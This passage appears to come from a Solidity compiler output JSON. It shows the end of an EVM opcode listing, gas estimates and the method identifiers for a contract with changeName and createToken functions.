SSTORE POP JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP7 0x4D 0x2A PUSH31 0x9EC20B0C7C8C3C0390A6B726157753699D41D18AC2B760EB64D189664736F PUSH13 0x63430006060033A26469706673 PC 0x22 SLT KECCAK256 SMOD SWAP9 0xEF PUSH13 0x2224810A3CE6B71D9D412A3B61 MSIZE KECCAK256 0xE2 0xA8 0xBE PUSH11 0xC43DE865FE3660FA646473 PUSH16 0x6C634300060600330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "188400",
						"executionCost": "232",
						"totalCost": "188632"
					},
					"external": {
						"changeName(address,bytes32)": "infinite",
						"createToken(bytes32)": "infinite"
					}
				},
				"methodIdentifiers": {
					"changeName(address,bytes32)": "7379b422",
					"createToken(bytes32)": "ae3edb65"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}